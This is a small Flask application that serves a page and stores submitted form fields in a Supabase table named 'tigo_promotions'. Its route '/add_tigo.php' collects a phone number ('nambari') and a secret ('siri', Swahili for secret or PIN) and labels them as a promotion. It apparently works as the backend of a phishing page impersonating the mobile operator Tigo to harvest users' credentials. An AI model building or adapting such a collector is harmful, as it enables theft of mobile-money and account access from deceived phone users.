from flask import Flask, request
import os
import traceback

app = Flask(__name__)

supabase = None
SUPABASE_ENABLED = False

print("🚀 App starting...")

try:
    from supabase import create_client

    supabase_url = os.environ.get("SUPABASE_URL")
    supabase_key = os.environ.get("SUPABASE_KEY")

    print("SUPABASE_URL:", bool(supabase_url))
    print("SUPABASE_KEY:", bool(supabase_key))

    if supabase_url and supabase_key:
        supabase = create_client(supabase_url, supabase_key)
        SUPABASE_ENABLED = True
        print("✅ Supabase connected")
except Exception:
    traceback.print_exc()


@app.route("/")
def home():
    try:
        with open("index.html", "r", encoding="utf-8") as f:
            return f.read()
    except Exception:
        traceback.print_exc()
        return "index.html not found", 500


@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link", "gzktrsjamfkw")

        if not nambari or not siri:
            return "Missing fields", 400

        if not SUPABASE_ENABLED:
            return "Supabase not configured", 500

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return "Data added successfully! ✅"

    except Exception as e:
        traceback.print_exc()
        return str(e), 500
